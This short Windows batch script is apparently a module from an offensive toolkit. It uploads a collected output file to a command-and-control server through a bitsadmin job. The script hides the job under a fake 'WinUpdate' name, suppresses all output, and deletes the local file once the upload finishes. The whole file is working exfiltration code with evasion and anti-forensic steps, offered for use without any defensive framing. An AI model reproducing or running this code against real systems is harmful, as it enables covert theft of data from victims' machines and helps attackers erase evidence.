REM provides: exfil_bitsadmin
REM depends: core/output
REM description: Exfiltrate collected data via bitsadmin upload job

if not defined C2_IP set "C2_IP=10.0.2.2"
if not defined C2_PORT set "C2_PORT=9001"

set "JOB_NAME=WinUpdate%RANDOM%"
bitsadmin /create "%JOB_NAME%" >nul 2>nul
bitsadmin /addfile "%JOB_NAME%" "%OUTPUT_FILE%" "http://%C2_IP%:%C2_PORT%/upload" >nul 2>nul
bitsadmin /setnotifycmdline "%JOB_NAME%" cmd.exe "/c del /f /q \"%OUTPUT_FILE%\"" >nul 2>nul
bitsadmin /resume "%JOB_NAME%" >nul 2>nul
REM job completes async; bitsadmin cleans up after 90 days by default
